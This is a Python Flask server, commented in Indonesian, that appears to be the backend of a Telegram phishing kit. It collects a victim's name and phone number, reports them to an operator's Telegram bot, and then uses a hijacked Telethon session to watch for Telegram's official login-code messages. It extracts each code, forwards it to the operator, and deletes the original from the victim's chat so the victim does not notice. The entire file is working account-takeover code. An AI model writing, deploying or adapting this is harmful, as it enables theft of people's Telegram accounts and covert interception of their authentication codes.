import os, asyncio, json, re, requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

SESSION_DIR = '/tmp/sessions/'
if not os.path.exists(SESSION_DIR): os.makedirs(SESSION_DIR)

# Simpan info pesan bot supaya bisa di-edit nanti
active_monitoring = {}

def send_bot_initial(nama, nomor):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    text = f"Nama: {nama}\nNomor: {nomor}\nKata sandi: None\n\n      otp"
    # Tombol OTP Inline
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "reply_markup": {
            "inline_keyboard": [[{"text": "otp", "callback_data": f"track_{nomor}"}]]
        }
    }
    r = requests.post(url, json=payload).json()
    return r.get("result", {}).get("message_id")

def update_bot_otp(message_id, nama, nomor, otp_code):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    text = f"Nama: {nama}\nNomor: {nomor}\nKata sandi: None\n\n      otp\n\n✅ OTP Ditemukan: `{otp_code}`"
    payload = {
        "chat_id": CHAT_ID,
        "message_id": message_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=payload)

@app.route('/register', methods=['POST'])
async def register():
    data = request.json
    nama = data.get('nama', 'Na')
    nomor_raw = data.get('nomor')
    
    # Auto-format ke +62
    n = re.sub(r'\D', '', nomor_raw)
    nomor = '+62' + n[1:] if n.startswith('08') else '+' + n
    
    # Kirim pesan awal ke bot dan simpan ID pesannya
    msg_id = send_bot_initial(nama, nomor)
    
    active_monitoring[nomor] = {
        "nama": nama,
        "msg_id": msg_id,
        "status": "waiting"
    }
    
    return jsonify({"status": "ok"}), 200

@app.route('/webhook', methods=['POST'])
async def webhook():
    data = request.json
    if "callback_query" in data:
        cb = data["callback_query"]
        callback_data = cb["data"]
        
        if callback_data.startswith("track_"):
            nomor = callback_data.replace("track_", "")
            
            # Jalankan background task untuk mengintip
            asyncio.create_task(start_ghost_mode(nomor))
            
            # Notif kecil di Telegram
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", 
                          json={"callback_query_id": cb["id"], "text": "Ghost Mode Aktif! Mengintip..."})
            
    return jsonify({"status": "ok"}), 200

async def start_ghost_mode(nomor):
    client = TelegramClient(f"{SESSION_DIR}{nomor}", int(API_ID), API_HASH)
    await client.connect()
    
    if not await client.is_user_authorized():
        # Jika belum login, kita tidak bisa intip. 
        # (Catatan: Ghost mode butuh login pertama kali via web atau manual)
        return

    @client.on(events.NewMessage(from_users=777000)) # ID Telegram Resmi
    async def handler(event):
        pesan = event.raw_text
        # Cari angka 5-6 digit (kode OTP)
        otp_match = re.search(r'\b\d{5,6}\b', pesan)
        if otp_match:
            otp_code = otp_match.group()
            info = active_monitoring.get(nomor)
            if info:
                # Update pesan di bot Abang (Tampilan Gambar 1)
                update_bot_otp(info["msg_id"], info["nama"], nomor, otp_code)
                # Hapus chat OTP dari telegram target (Ghost Mode)
                await event.delete()

    await client.run_until_disconnected()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)